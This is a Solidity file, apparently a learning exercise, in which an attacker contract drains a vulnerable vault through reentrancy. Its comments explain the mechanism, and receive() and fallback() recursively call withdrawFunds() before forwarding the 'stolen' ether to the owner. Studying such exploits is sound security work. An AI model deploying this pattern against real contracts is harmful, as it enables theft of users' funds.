// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

/**
A loop does not work because it executes entirely inside one call frame, and the vault’s state changes are only observed after calls return.
Reentrancy works because when the vault sends Ether, the EVM transfers execution control to the attacker contract before updating the vault’s internal state.
The attacker’s receive() executes in a new call frame and recursively calls withdrawFunds() while the vault still believes the balance is unchanged.

Reentrancy is not about calling again — it’s about control leaving the contract before state is updated.
 */

interface IVault {
    function putToVault() external payable;
    function withdrawFunds(uint256 amount) external;
    function myBallanceInVault() external view returns (uint256);
}

contract AttackerContract {
    address private constant VAULT_ADDRESS =
        0xd9145CCE52D386f254917e481eB44e9943F39138;
    address private immutable i_owner;
    IVault private immutable vault;
    uint256 public stolen;

    constructor() {
        i_owner = msg.sender;
        vault = IVault(VAULT_ADDRESS);
    }

    function sendEther() external payable {
        (bool ok, ) = VAULT_ADDRESS.call{value: 1e18}("");
    }

    function sendEtherToMyAccount() external {
        (bool ok, ) = i_owner.call{value: address(this).balance}("");
    }

    function triggerWithdraw() external {
        vault.withdrawFunds(1 ether);
    }

    // This where the reetrancy exists in this two functions, because of a recursive logic and EVM "kindof" passing controle form contract to another 
    receive() external payable {
        if (VAULT_ADDRESS.balance >= 1 ether && stolen < 10 ether) {
            stolen += 1 ether;
            vault.withdrawFunds(1 ether);
        }
    }

    fallback() external payable {
        if (VAULT_ADDRESS.balance >= 1 ether && stolen < 10 ether) {
            stolen += 1 ether;
            vault.withdrawFunds(1 ether);
        }
    }
}
